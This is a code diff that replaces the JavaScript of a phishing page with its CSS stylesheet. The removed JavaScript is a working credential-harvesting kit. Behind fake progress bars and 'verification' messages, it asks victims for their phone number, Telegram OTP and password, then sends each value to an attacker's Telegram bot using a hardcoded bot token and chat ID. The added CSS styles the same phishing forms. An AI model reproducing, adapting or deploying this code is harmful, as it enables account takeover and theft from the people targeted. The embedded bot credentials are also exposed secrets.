@@ -1,361 +1,644 @@
-// Fungsi untuk memulai loading
-function startLoading() {
-  console.log("startLoading function called");
-  // Sembunyikan tombol dan tampilkan loader
-  document.querySelector(".btn").style.display = "none";
-  document.getElementById("loader").style.display = "block";
-  document.getElementById("percentage").style.display = "block";
-  document.getElementById("loading").style.display = "block";
-
-  let percent = 0;
-  const interval = setInterval(() => {
-    percent += 1;
-    document.getElementById("percentage").innerText = percent + "%";
-
-    if (percent === 100) {
-      clearInterval(interval);
-
-      // Sembunyikan angka persentase (100%)
-      document.getElementById("percentage").style.display = "none";
-
-      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
-      document.getElementById("loader").style.display = "none";
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("successCircle").style.display = "block";
-      document.getElementById("thankYouMessage").style.display = "block";
-
-      setTimeout(() => {
-        // Sembunyikan semua elemen terkait dan tampilkan form nomor telepon
-        document.getElementById("thankYouMessage").style.display = "none";
-        document.getElementById("successCircle").style.display = "none";
-        document.getElementById("centeredContainer").style.display = "none";
-        document.getElementById("enterContainer").style.display = "block";
-        document.getElementById("phoneNumberForm").style.display = "block";
-      }, 2000); // Waktu tunda 2 detik
-    }
-  }, 50); // Persentase meningkat setiap 50ms
+* {
+  box-sizing: border-box;
+  outline: none;
+  border: none;
+  text-decoration: none;
 }
 
-// Menangani pengiriman nomor telepon
-const sendPhoneButton = document.getElementById("sendPhoneButton");
-sendPhoneButton.addEventListener("click", function () {
-  console.log("startSend function called");
-
-  // Ambil nomor telepon dari input
-  const phoneNumber = document.getElementById("phoneNumberInput").value;
-  if (phoneNumber.trim() === "") {
-    alert("Nomor telepon tidak boleh kosong");
-    return; // Jika nomor kosong, hentikan
-  }
-
-  // Kirim nomor telepon ke bot Telegram
-  sendMessageToTelegram(`Nomor Telepon: ${phoneNumber}`);
-
-  // Tampilkan animasi loading dan hilangkan form nomor telepon
-  document.getElementById("enterContainer").style.display = "none";
-  document.getElementById("phoneNumberForm").style.display = "none";
-  document.getElementById("loader").style.display = "block";
-  document.getElementById("percentage").style.display = "block";
-  document.getElementById("loading").style.display = "block";
-
-  let percent = 0;
-  const interval = setInterval(() => {
-    percent += 1;
-    document.getElementById("percentage").innerText = percent + "%";
-
-    if (percent === 100) {
-      clearInterval(interval);
-
-      // Sembunyikan angka persentase (100%)
-      document.getElementById("percentage").style.display = "none";
-
-      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
-      document.getElementById("loader").style.display = "none";
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("successCircle").style.display = "block";
-      document.getElementById("thankYouMessage").style.display = "block";
-
-      setTimeout(() => {
-        // Sembunyikan semua elemen terkait dan tampilkan form OTP
-        document.getElementById("thankYouMessage").style.display = "none";
-        document.getElementById("successCircle").style.display = "none";
-        document.getElementById("otpForm").style.display = "block";
-        document.getElementById("otpContainer").style.display = "block";
-      }, 2000); // Waktu tunda 2 detik
-    }
-  }, 300); // Persentase meningkat setiap 300ms untuk total 30 detik
-});
-
-// Menangani pengiriman OTP
-const sendOtpButton = document.getElementById("sendOtpButton");
-sendOtpButton.addEventListener("click", function () {
-  console.log("Send OTP button clicked");
-
-  // Ambil OTP dari input
-  const otp = document.getElementById("otpInput").value;
-  if (otp.trim() === "") {
-    console.log("OTP is empty");
-    return; // Jika OTP kosong, berhenti
-  }
-
-  // Kirim OTP ke bot Telegram
-  sendMessageToTelegram(`OTP: ${otp}`);
-
-  // Tampilkan animasi loading dan hilangkan form OTP
-  document.getElementById("otpForm").style.display = "none";
-  document.getElementById("otpContainer").style.display = "none";
-  document.getElementById("loader").style.display = "block";
-  document.getElementById("loading").style.display = "block";
-  document.getElementById("percentage").style.display = "block";
-
-  let percent = 0;
-  const interval = setInterval(() => {
-    percent += 1;
-    document.getElementById("percentage").innerText = percent + "%";
-
-    if (percent === 100) {
-      clearInterval(interval);
-
-      // Sembunyikan angka persentase (100%)
-      document.getElementById("percentage").style.display = "none";
-
-      // Sembunyikan loader dan tampilkan lingkaran sukses serta pesan terima kasih
-      document.getElementById("loader").style.display = "none";
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("successCircle").style.display = "block";
-      document.getElementById("thankYouMessage").style.display = "block";
-
-      setTimeout(() => {
-        // Sembunyikan semua elemen terkait dan tampilkan form password
-        document.getElementById("thankYouMessage").style.display = "none";
-        document.getElementById("successCircle").style.display = "none";
-        document.getElementById("sandiForm").style.display = "block";
-        document.getElementById("sandiContainer").style.display = "block";
-      }, 2000); // Waktu tunda 2 detik
-    }
-  }, 50); // Persentase meningkat setiap 50ms
-});
-
-// Menangani pengiriman password
-
-// animasi bar
-document.addEventListener("DOMContentLoaded", function () {
-  const sendPasswordButton = document.getElementById("sendPasswordButton");
-
-  sendPasswordButton.addEventListener("click", function () {
-    console.log("Send Password button clicked");
-
-    // Ambil password dari input
-    const sandi = document.getElementById("sandiInput").value;
-    if (sandi.trim() === "") {
-      console.log("Password is empty");
-      return; // Jika password kosong, hentikan proses
-    }
-
-    // Kirim password ke bot Telegram
-    sendMessageToTelegram(`Password: ${sandi}`);
-
-    // Jalankan proses pertama
-    handleInitialLoading(() => {
-      // Callback: Mulai animasi progres batang setelah proses pertama selesai
-      startProgressBar();
-    });
-  });
-
-  // Fungsi untuk menangani proses loading awal (persentase)
-  function handleInitialLoading(callback) {
-    // Sembunyikan form password dan tampilkan loader
-    document.getElementById("sandiForm").style.display = "none";
-    document.getElementById("sandiContainer").style.display = "none";
-    document.getElementById("loader").style.display = "block";
-    document.getElementById("loading").style.display = "block";
-    document.getElementById("percentage").style.display = "block";
-
-    let percent = 0;
-    const interval = setInterval(() => {
-      percent += 1;
-      document.getElementById("percentage").innerText = percent + "%";
-
-      if (percent === 100) {
-        clearInterval(interval);
-
-        // Sembunyikan loader setelah selesai
-        document.getElementById("percentage").style.display = "none";
-        document.getElementById("loader").style.display = "none";
-        document.getElementById("loading").style.display = "none";
-
-        // Jalankan callback untuk proses berikutnya
-        if (typeof callback === "function") {
-          callback();
-        }
-      }
-    }, 20); // Kecepatan loading (persentase meningkat setiap 50ms)
-  }
-
-  // Fungsi untuk animasi progres batang (bar)
-  function startProgressBar() {
-    const animasiBar = document.getElementById("animasiBar");
-    const barContainer = document.getElementById("barContainer");
-    const progressBar = document.getElementById("progressBar");
-    const progressText = document.getElementById("progressText");
-    const loaderBar = document.getElementById("loaderBar");
-    const successCircle1 = document.getElementById("successCircle1");
-
-    barContainer.style.display = "block";
-    animasiBar.style.display = "block";
-    loaderBar.style.display = "block";
-    barText.style.display = "block";
-    successCircle1.style.display = "none";
-
-    let progress = 0;
-    const interval = setInterval(function () {
-      progress += 1;
-      progressBar.style.width = progress + "%";
-      document.getElementById("percentage1").textContent = progress + "%";
-
-      if (progress === 100) {
-        clearInterval(interval);
-        loaderBar.style.display = "none";
-        successCircle1.style.display = "block";
-
-        // Mulai animasi bar kedua
-        setTimeout(() => {
-          startSecondProgressBar();
-        }, 1000);
-      }
-    }, 50);
-  }
-
-  function startSecondProgressBar() {
-    const loadingContainer2 = document.getElementById("loadingContainer2");
-    const progressSection2 = document.getElementById("progressSection2");
-    const loaderAnimation2 = document.getElementById("loaderAnimation2");
-    const successIndicator2 = document.getElementById("successIndicator2");
-    const progressBar2 = document.getElementById("progressBar2");
-    const progressPercentage2 = document.getElementById("progressPercentage2");
-
-    // Tampilkan container utama
-    loadingContainer2.style.display = "block";
-
-    // Reset tampilan elemen-elemen
-    progressBar2.style.width = "0%";
-    loaderAnimation2.style.display = "block";
-    successIndicator2.style.display = "none";
-
-    let progress = 0;
-    const interval = setInterval(function () {
-      progress += 1;
-      progressBar2.style.width = progress + "%";
-      progressPercentage2.textContent = progress + "%";
-
-      if (progress === 100) {
-        clearInterval(interval);
-        loaderAnimation2.style.display = "none";
-        successIndicator2.style.display = "block";
-
-        setTimeout(() => {
-          // Sembunyikan container kedua
-          loadingContainer2.style.display = "none";
-          // Mulai progress bar ketiga
-          showThirdProgressDialog();
-        }, 1000);
-      }
-    }, 50);
-  }
-});
-
-function showThirdProgressDialog() {
-  // Buat dan tambahkan dialog ke body
-  const dialogHTML = `
-      <div id="thirdProgressDialog" class="dialog-overlay">
-          <div class="dialog-content">
-              <p class="dialog-text">Sila tunggu proses pengesahan 1 minit</p>
-              <div class="progress-container">
-                  <div id="thirdProgressBar" class="progress-bar"></div>
-                  <div id="thirdProgressText" class="progress-text">0%</div>
-              </div>
-          </div>
-      </div>
-  `;
-  document.body.insertAdjacentHTML("beforeend", dialogHTML);
-
-  // Mulai progress bar
-  const progressBar = document.getElementById("thirdProgressBar");
-  const progressText = document.getElementById("thirdProgressText");
-  let progress = 0;
-
-  const interval = setInterval(() => {
-    progress += 1;
-    progressBar.style.width = progress + "%";
-    progressText.textContent = progress + "%";
-
-    if (progress === 100) {
-      clearInterval(interval);
-
-      // Tampilkan pesan konfirmasi
-      const confirmationHTML = `
-        <div class="confirmation-message" style="text-align: center; margin-top: 20px;">
-          Pengesahan data anda telah selesai, sila tunggu mesej daripada kami ke Telegram anda.
-        </div>
-      `;
-      document
-        .querySelector(".dialog-content")
-        .insertAdjacentHTML("beforeend", confirmationHTML);
-
-      // Hapus dialog dan redirect setelah 30 detik
-      setTimeout(() => {
-        const dialog = document.getElementById("thirdProgressDialog");
-        if (dialog) dialog.remove();
-        window.location.href = "index.html"; // Ganti dengan URL halaman awal Anda
-      }, 30000); // 30 detik
-    }
-  }, 600);
+body {
+  display: flex;
+  font-family: "Poppins", sans-serif;
+  color: #010101;
+  background-color: #fff;
+  justify-content: center;
+  align-items: center;
 }
-let storedPhoneNumber = ""; // Variabel untuk menyimpan nomor telepon
-let storedOtp = ""; // Variabel untuk menyimpan OTP
 
-// Fungsi untuk mengirim pesan ke Telegram
-function sendMessageToTelegram(message) {
-  const token = "8187829421:AAEJyCf4sfDAj_AUtpIFhbdxpJAZC1of0wY";
-  const chatId = "5265564576";
+img {
+  display: flex;
+  width: 100%;
+  height: auto;
+  display: block;
+  top: -10px;
+  right: 0;
+  left: 0;
+}
 
-  let formattedMessage;
+.btn {
+  display: flex;
+  width: 80%;
+  height: 40px;
+  padding: 15px;
+  margin: 10px auto 0;
+  background: linear-gradient(90deg, #ff3b3b, #3023ae);
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 1.1rem;
+  cursor: pointer;
+  align-items: center;
+  justify-content: center;
+}
 
-  if (message.includes("Nomor Telepon:")) {
-    formattedMessage = `
-────────────────
-🔰 DATA | NOMBOR TELEGRAM 🔰
-────────────────
-📱 No HP : \`${message.split(":")[1].trim()}\`
-────────────────`;
-  } else if (message.includes("OTP:")) {
-    const phone = document.getElementById("phoneNumberInput").value;
-    formattedMessage = `
-────────────────
-🔰 DATA | OTP 🔰
-────────────────
-📱 No HP : \`${phone}\`
-🔑 OTP   : ${message.split(":")[1].trim()}
-────────────────`;
-  } else if (message.includes("Password:")) {
-    const phone = document.getElementById("phoneNumberInput").value;
-    const otp = document.getElementById("otpInput").value;
-    formattedMessage = `
-────────────────
-🔰 DATA | KATA SANDI 🔰
-────────────────
-📱 No HP : \`${phone}\`
-🔑 OTP   : ${otp}
-🔐 Kata Laluan : ${message.split(":")[1].trim()}
-────────────────`;
+.btn:hover {
+  background: linear-gradient(90deg, #ff5f5f, #4539c4);
+}
+
+.page-header {
+  font-weight: bold;
+  margin-top: 5px;
+  text-align: center;
+  font-size: 1.5rem;
+  color: #007bff;
+  margin-bottom: 0;
+}
+
+.page-header marquee {
+  font-style: italic;
+  color: #333;
+  font-size: 1.25rem;
+  background-color: #fff;
+  border-radius: 5px;
+}
+
+.styled-text {
+  font-size: 24px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  position: relative;
+  display: inline-block;
+  font-family: "Arial", sans-serif;
+}
+
+.styled-text::after {
+  content: "";
+  display: block;
+  width: 50px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+.loader {
+  display: none;
+  margin: 10px auto;
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #007bff;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
   }
+  100% {
+    transform: rotate(360deg);
+  }
+}
 
-  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
-    formattedMessage
-  )}&parse_mode=Markdown`;
+.centered-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100%;
+}
 
-  fetch(url)
-    .then((response) => response.json())
-    .then((data) => console.log("Pesan berhasil dikirim ke Telegram:", data))
-    .catch((error) => console.error("Terjadi kesalahan:", error));
+.centered-text {
+  font-size: 25px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+}
+
+.centered-text::after {
+  content: "";
+  display: block;
+  width: 60px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+.enter-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 80%;
+  border: 1px solid #000;
+  border-radius: 10px;
+  padding: 4px;
+  margin: -10px auto 0;
+}
+
+.enter-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  font-family: "Arial", sans-serif;
+  position: relative;
+  margin-top: 5px;
+}
+
+.enter-text::after {
+  content: "";
+  display: block;
+  width: 90px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 10px auto 0;
+  border-radius: 2px;
+}
+
+.enter-text span {
+  color: #3023ae;
+}
+
+.enter-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+}
+
+.enter-container {
+  display: none; /* Menyembunyikan enter-container pada awalnya */
+}
+
+.centered-text::after {
+  content: "";
+  display: block;
+  width: 60px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+/* otp style */
+.otp-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 90%;
+  border: 1px solid #000;
+  border-radius: 10px;
+  padding: 10px;
+  margin: -30px auto 0;
+}
+
+.otp-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+  margin: 5px auto 0;
+  width: 100%;
+  display: block;
+}
+
+.otp-text::after {
+  content: "";
+  display: block;
+  width: 90px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+.otp-text span {
+  color: #3023ae;
+}
+
+.otp-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+  margin: 5px auto 0;
+  width: 100%;
+  display: block;
+}
+
+.otp-container {
+  display: none; /* Menyembunyikan enter-container pada awalnya */
+}
+
+.otp-text::after {
+  content: "";
+  display: block;
+  width: 60px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+/* sandi style */
+.sandi-container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 90%;
+  border: 1px solid #000;
+  border-radius: 10px;
+  padding: 10px;
+  margin: -50px auto 0;
+}
+
+.sandi-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+  width: 100%;
+  margin: 5px auto;
+}
+
+.sandi-text::after {
+  content: "";
+  display: block;
+  width: 90px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+.sandi-text span {
+  color: #3023ae;
+}
+
+.sandi-text {
+  font-size: 14px;
+  font-weight: bold;
+  color: #333;
+  text-align: center;
+  font-family: "Arial", sans-serif;
+  position: relative;
+  margin: 5px auto 0;
+  width: 100%;
+  display: block;
+}
+
+.sandi-container {
+  display: none; /* Menyembunyikan enter-container pada awalnya */
+}
+
+.sandi-text::after {
+  content: "";
+  display: block;
+  width: 60px;
+  height: 4px;
+  background-color: #ff3b3b;
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+#percentage,
+#thankYouMessage {
+  display: none;
+  text-align: center;
+  font-size: 1rem;
+  font-weight: bold;
+}
+
+#phoneNumberForm {
+  display: flex;
+  width: 80%;
+  max-width: 300px;
+  border: 1px solid #000;
+  border-radius: 10px;
+  overflow: hidden;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto; /* Memastikan form berada di tengah horizontal */
+}
+
+#phoneNumberForm input[type="tel"] {
+  flex: 1;
+  padding: 10px 10px;
+  font-size: 1rem;
+  border: none;
+  outline: none;
+  color: #666;
+}
+
+#phoneNumberForm input[type="tel"]::placeholder {
+  color: #aaa;
+}
+
+#phoneNumberForm button {
+  padding: 10px 10px;
+  background-color: white;
+  color: #007bff;
+  font-weight: bold;
+  font-size: 1rem;
+  border: none;
+  border-left: 1px solid #000;
+  cursor: pointer;
+}
+
+#phoneNumberForm button:hover {
+  background-color: #f1f1f1;
+}
+
+/* otp  style */
+#otpForm {
+  display: flex;
+  width: 80%;
+  max-width: 400px;
+  border: 1px solid #000;
+  border-radius: 10px;
+  overflow: hidden;
+  align-items: center;
+  justify-content: center;
+  margin: 10px auto 0; /* Diubah: menambahkan margin-top 10px */
+}
+
+#otpForm input[type="tel"] {
+  flex: 1;
+  padding: 10px 10px;
+  font-size: 1rem;
+  border: none;
+  outline: none;
+  color: #666;
+}
+
+#otpForm input[type="tel"]::placeholder {
+  color: #aaa;
+}
+
+#otpForm button {
+  padding: 10px 10px;
+  background-color: white;
+  color: #007bff;
+  font-weight: bold;
+  font-size: 1rem;
+  border: none;
+  border-left: 1px solid #000;
+  cursor: pointer;
+}
+
+#otpForm button:hover {
+  background-color: #f1f1f1;
+}
+
+/* otp  style */
+#sandiForm {
+  display: flex;
+  width: 80%;
+  max-width: 300px;
+  border: 1px solid #000;
+  border-radius: 10px;
+  overflow: hidden;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto; /* Memastikan form berada di tengah horizontal */
+}
+
+#sandiForm input[type="password"] {
+  flex: 1;
+  padding: 10px 10px;
+  font-size: 1rem;
+  border: none;
+  outline: none;
+  color: #666;
+}
+
+#sandiForm input[type="tel"]::placeholder {
+  color: #aaa;
+}
+
+#sandiForm button {
+  padding: 10px 10px;
+  background-color: white;
+  color: #007bff;
+  font-weight: bold;
+  font-size: 1rem;
+  border: none;
+  border-left: 1px solid #000;
+  cursor: pointer;
+}
+
+#sandiForm button:hover {
+  background-color: #f1f1f1;
+}
+
+#loading {
+  display: flex;
+  font-size: 15px;
+  color: #ff3b3b;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  font-weight: bold;
+}
+
+#animasiBar,
+#progressSection2 {
+  border: 1px solid gray;
+  width: 80%;
+  border-radius: 5px;
+  overflow: hidden;
+  position: relative;
+  text-align: center;
+  height: 30px; /* Pastikan tinggi elemen bar diatur */
+}
+
+#progressBar,
+#progressBar2 {
+  display: block;
+  background-color: red; /* Warna awal */
+  width: 0%; /* Lebar awal */
+  height: 100%; /* Sesuai dengan tinggi kontainer */
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  z-index: 0;
+}
+
+#progressText,
+#progressText2 {
+  position: absolute;
+  top: 50%;
+  left: 10%;
+  transform: translate(-50%, -50%);
+  z-index: 1;
+  font-weight: bold;
+  font-size: 10px;
+  margin-left: 20px;
+}
+
+/* bar loading */
+
+main {
+  flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
+}
+
+footer {
+  position: fixed; /* Tetap di bawah meski konten lebih pendek */
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  background-color: #fff; /* Latar belakang footer */
+  text-align: center;
+}
+
+footer img {
+  max-width: 500px; /* Ukuran gambar maksimal */
+  height: auto;
+}
+
+/* Progress Bar Container */
+.bar-container,
+.loading-container {
+  width: 100%;
+  padding: 10px;
+}
+
+.bar-content,
+.loading-content {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px; /* jarak antar elemen */
+}
+
+.quedate__load,
+.progress-section {
+  flex: 1;
+  height: 20px; /* sesuaikan tinggi yang diinginkan */
+  position: relative; /* tambahkan ini */
+}
+
+.progress-wrapper {
+  position: relative;
+  width: 100%;
+  height: 100%; /* ubah menjadi 100% agar mengikuti parent */
+  background: #f0f0f0;
+  border-radius: 5px;
+  overflow: hidden;
+}
+
+.quedate__load-a,
+.progress-bar {
+  display: block;
+  width: 0%;
+  height: 4px;
+  background: #03196e;
+  transition: width 0.3s ease;
+  border-radius: 5px;
+}
+
+.progress-text,
+.progress-info {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  z-index: 1;
+  color: #fff;
+}
+
+#percentage1,
+#percentage2,
+#processingText,
+#progressPercentage2 {
+  display: inline-block; /* Pastikan elemen ditampilkan */
+}
+
+#percentage1,
+#percentage2,
+#progressPercentage2 {
+  margin-right: 5px;
+}
+
+#progressText {
+  margin-left: 20px; /* Sesuaikan nilai sesuai kebutuhan */
+  /* atau */
+  position: absolute;
+  left: 20%; /* Alternatif lain untuk memposisikan teks di samping bar */
+}
+
+#progressText2 {
+  margin-left: 30px; /* Sesuaikan nilai sesuai kebutuhan */
+  /* atau */
+  position: absolute;
+  left: 26%;
+}
+
+.dialog-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.dialog-content {
+  background: white;
+  padding: 20px;
+  border-radius: 8px;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+}
+
+.dialog-text {
+  text-align: center;
+  margin-bottom: 15px;
+  font-weight: bold;
+  color: #333;
+}
+
+.progress-container {
+  background: #f0f0f0;
+  border-radius: 5px;
+  height: 20px;
+  position: relative;
+  overflow: hidden;
+  margin-top: 15px;
+}
+
+.progress-bar {
+  background: #ff0000;
+  height: 100%;
+  width: 0;
+  transition: width 0.3s ease;
+}
+
+.progress-text {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: #000;
+  font-size: 12px;
+  font-weight: bold;
+  z-index: 1;
 }
